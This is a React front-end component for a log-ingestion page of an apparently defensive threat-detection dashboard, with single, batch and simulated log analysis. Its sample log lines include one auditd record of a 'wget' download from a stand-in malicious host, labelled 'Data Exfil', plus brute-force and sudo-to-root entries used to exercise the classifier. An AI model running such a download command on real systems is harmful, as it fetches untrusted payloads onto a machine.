import React, { useState } from 'react';
import { logsAPI } from '../utils/api';

const SAMPLES = `Jan 15 10:23:45 server01 sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 10:23:46 server01 sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2
Jan 15 10:23:47 server01 sshd[1234]: Failed password for admin from 192.168.1.100 port 22 ssh2
Jan 15 10:25:00 server01 kernel: Possible SYN flooding on port 80. Sending cookies.
Jan 15 10:26:00 server01 sudo: admin: TTY=pts/0 ; USER=root ; COMMAND=/bin/bash
Jan 15 10:27:00 server01 sshd[1235]: Accepted publickey for deploy from 10.0.0.5 port 4532 ssh2
Jan 15 10:28:00 server01 apache2[980]: 198.51.100.5 - GET /admin HTTP/1.1 403 289`;

const EXAMPLES = [
  { label: 'Brute Force', val: 'Jan 15 10:23:45 server01 sshd[1234]: Failed password for root from 192.168.1.100 port 22 ssh2' },
  { label: 'SYN Flood',   val: 'Jan 15 10:25:00 server01 kernel: Possible SYN flooding on port 80. Sending cookies.' },
  { label: 'Sudo Abuse',  val: 'Jan 15 10:26:00 server01 sudo: hacker: TTY=pts/1 ; USER=root ; COMMAND=/bin/bash' },
  { label: 'Data Exfil',  val: 'Jan 15 10:33:00 server01 auditd: type=EXECVE a0=wget a1=-q a2=http://malicious.com/payload' },
];

const SEV_COLORS = { CRITICAL:'#f43f5e', HIGH:'#f97316', MEDIUM:'#fbbf24', LOW:'#10b981', NORMAL:'#10b981' };

export default function IngestPage() {
  const [mode, setMode] = useState('single');
  const [single, setSingle] = useState('');
  const [batch, setBatch] = useState('');
  const [result, setResult] = useState(null);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState(null);

  const run = async (fn) => {
    setLoading(true); setError(null); setResult(null);
    try { const res = await fn(); setResult(res.data); }
    catch (e) { setError(e.response?.data?.error || e.message); }
    finally { setLoading(false); }
  };

  const batchLines = batch.split('\n').filter(l => l.trim());

  const ThreatTag = ({ c }) => {
    if (!c) return null;
    const clr = SEV_COLORS[c.severity] || '#71717a';
    return (
      <span className="inline-flex items-center gap-1.5 px-2.5 py-0.5 rounded-full text-[10px] font-mono font-bold flex-shrink-0 border"
        style={{ color: clr, background: clr+'18', borderColor: clr+'33' }}>
        {c.threat_type} · {c.severity}{c.confidence ? ` · ${(c.confidence*100).toFixed(0)}%` : ''}
      </span>
    );
  };

  const TABS = [
    { id: 'single', label: 'Single Line' },
    { id: 'batch', label: 'Batch Import' },
    { id: 'simulate', label: '⚡ Simulate' },
  ];

  return (
    <div className="page-enter">
      {/* Header */}
      <div className="mb-6">
        <div className="text-[10px] font-mono font-bold text-emerald-500 uppercase tracking-widest mb-1">Data Input</div>
        <h1 className="text-xl font-bold text-zinc-100 tracking-tight">Log Ingestion</h1>
        <p className="text-sm text-zinc-500 mt-1">Submit log lines for real-time analysis and threat classification</p>
      </div>

      {/* Mode tabs + input card */}
      <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5 mb-4">
        {/* Tabs */}
        <div className="flex gap-1 p-1 bg-zinc-950 rounded-lg border border-zinc-800 mb-5 w-fit">
          {TABS.map(t => (
            <button key={t.id} onClick={() => setMode(t.id)}
              className={`px-4 py-2 rounded-md text-sm font-bold transition-all ${mode === t.id ? 'grad-btn shadow' : 'text-zinc-500 hover:text-zinc-200'}`}>
              {t.label}
            </button>
          ))}
        </div>

        {/* Single */}
        {mode === 'single' && (
          <div>
            <label className="block text-[10px] font-mono font-bold text-zinc-600 uppercase tracking-widest mb-2">Log Line</label>
            <textarea
              className="w-full bg-zinc-950 border border-zinc-700 rounded-lg text-zinc-200 placeholder-zinc-700 px-4 py-3 font-mono text-xs leading-relaxed resize-none outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/20 transition-all"
              rows={4}
              placeholder="Jan 15 10:23:45 server01 sshd[1234]: Failed password for root..."
              value={single} onChange={e => setSingle(e.target.value)}
            />
            <div className="flex items-center gap-2 mt-3 flex-wrap">
              <button onClick={() => run(() => logsAPI.ingest(single.trim()))} disabled={loading || !single.trim()}
                className="flex items-center gap-2 px-4 py-2 rounded-lg grad-btn text-sm font-bold disabled:opacity-40 transition-all">
                {loading ? <><span className="spinner w-3 h-3" style={{borderColor:'rgba(9,9,11,0.2)',borderTopColor:'#09090b'}}/>Analyzing...</> : '→ Analyze'}
              </button>
              <span className="text-[11px] font-mono text-zinc-700">examples:</span>
              {EXAMPLES.map(ex => (
                <button key={ex.label} onClick={() => setSingle(ex.val)}
                  className="px-2.5 py-1.5 text-[11px] font-mono font-bold rounded-lg bg-zinc-800 border border-zinc-700 text-zinc-400 hover:text-zinc-200 hover:border-zinc-600 transition-all">
                  {ex.label}
                </button>
              ))}
            </div>
          </div>
        )}

        {/* Batch */}
        {mode === 'batch' && (
          <div>
            <div className="flex items-center justify-between mb-2">
              <label className="text-[10px] font-mono font-bold text-zinc-600 uppercase tracking-widest">Log Lines (one per line)</label>
              {batchLines.length > 0 && <span className="text-[11px] font-mono font-bold text-emerald-500">{batchLines.length} lines</span>}
            </div>
            <textarea
              className="w-full bg-zinc-950 border border-zinc-700 rounded-lg text-zinc-200 placeholder-zinc-700 px-4 py-3 font-mono text-xs leading-relaxed resize-y outline-none focus:border-emerald-500/50 focus:ring-1 focus:ring-emerald-500/20 transition-all"
              rows={10}
              placeholder="Paste your log lines here..."
              value={batch} onChange={e => setBatch(e.target.value)}
            />
            <div className="flex gap-2 mt-3">
              <button onClick={() => run(() => logsAPI.ingestBatch(batchLines))} disabled={loading || !batch.trim()}
                className="flex items-center gap-2 px-4 py-2 rounded-lg grad-btn text-sm font-bold disabled:opacity-40 transition-all">
                {loading ? <><span className="spinner w-3 h-3" style={{borderColor:'rgba(9,9,11,0.2)',borderTopColor:'#09090b'}}/>Processing...</> : `Analyze ${batchLines.length} Lines`}
              </button>
              <button onClick={() => setBatch(SAMPLES)}
                className="px-4 py-2 rounded-lg bg-zinc-800 border border-zinc-700 text-zinc-300 text-sm font-bold hover:bg-zinc-700 transition-all">
                Load Samples
              </button>
              {batch && <button onClick={() => { setBatch(''); setResult(null); }}
                className="px-4 py-2 rounded-lg bg-zinc-800 border border-zinc-700 text-zinc-500 text-sm font-bold hover:bg-zinc-700 transition-all">
                Clear
              </button>}
            </div>
          </div>
        )}

        {/* Simulate */}
        {mode === 'simulate' && (
          <div>
            <p className="text-sm text-zinc-400 mb-3 leading-relaxed">
              Generates and analyzes <span className="text-zinc-200 font-semibold">25 realistic Linux log entries</span> — SSH brute-force, SYN floods, port scans, unauthorized access, and normal activity — all stored in MongoDB.
            </p>
            <div className="bg-zinc-950 border border-zinc-800 rounded-lg px-4 py-3 mb-4 font-mono text-[11px] text-zinc-600 leading-relaxed">
              <span className="text-emerald-600">// Simulated attack classes</span><br/>
              BRUTE_FORCE · PORT_SCAN · DDOS · UNAUTHORIZED_ACCESS · DATA_EXFILTRATION · NORMAL
            </div>
            <button onClick={() => run(() => logsAPI.simulate(25))} disabled={loading}
              className="flex items-center gap-2 px-4 py-2 rounded-lg grad-btn text-sm font-bold disabled:opacity-40 transition-all">
              {loading ? <><span className="spinner w-3 h-3" style={{borderColor:'rgba(9,9,11,0.2)',borderTopColor:'#09090b'}}/>Simulating...</> : '⚡ Run Simulation (25 logs)'}
            </button>
          </div>
        )}
      </div>

      {/* Error */}
      {error && (
        <div className="bg-rose-500/5 border border-rose-500/20 rounded-xl px-5 py-4 mb-4">
          <div className="text-sm font-bold text-rose-400 mb-1">❌ Error</div>
          <div className="text-sm text-zinc-400">{error}</div>
          <div className="text-[11px] font-mono text-zinc-600 mt-2">ensure backend is running: <span className="text-zinc-400">python app.py</span></div>
        </div>
      )}

      {/* Results */}
      {result && (
        <div className="bg-zinc-900 border border-zinc-800 rounded-xl p-5">
          <div className="flex items-center gap-2 mb-4">
            <span className="w-1 h-4 grad-bar rounded-full block" />
            <span className="text-[11px] font-mono font-bold text-zinc-500 uppercase tracking-wider">Analysis Results</span>
          </div>

          {result.total_processed !== undefined && (
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 mb-5">
              {[
                { l:'Processed', v:result.total_processed, c:'text-sky-400' },
                { l:'Threats', v:result.threats_found, c:'text-rose-400' },
                { l:'Alerts', v:result.alerts_generated, c:'text-orange-400' },
                { l:'Normal', v:result.total_processed-result.threats_found, c:'text-emerald-400' },
              ].map(s => (
                <div key={s.l} className="bg-zinc-950 border border-zinc-800 rounded-lg p-3">
                  <div className="text-[10px] font-mono font-bold text-zinc-600 uppercase tracking-widest mb-1">{s.l}</div>
                  <div className={`text-2xl font-bold tracking-tight ${s.c}`}>{s.v}</div>
                </div>
              ))}
            </div>
          )}

          {result.results && (
            <div className="space-y-1.5 max-h-96 overflow-y-auto">
              {result.results.map((r, i) => (
                <div key={i} className={`flex items-center gap-3 px-3 py-2 rounded-lg border transition-colors ${r.threat_detected ? 'bg-rose-500/5 border-rose-500/15' : 'bg-emerald-500/5 border-emerald-500/10'}`}>
                  <span className="text-sm flex-shrink-0">{r.threat_detected ? '⚠️' : '✅'}</span>
                  <span className="flex-1 min-w-0 font-mono text-[11px] text-zinc-400 truncate">{r.log?.message || r.log?.raw}</span>
                  <ThreatTag c={r.classification} />
                </div>
              ))}
            </div>
          )}

          {!result.results && (
            <div>
              <div className="flex items-center gap-3 mb-4">
                <span className="text-base font-bold" style={{ color: SEV_COLORS[result.classification?.severity] || '#f4f4f5' }}>
                  {result.threat_detected ? '⚠️ Threat Detected' : '✅ Normal Activity'}
                </span>
                <ThreatTag c={result.classification} />
              </div>
              <pre className="result-panel">{JSON.stringify(result, null, 2)}</pre>
            </div>
          )}
        </div>
      )}
    </div>
  );
}
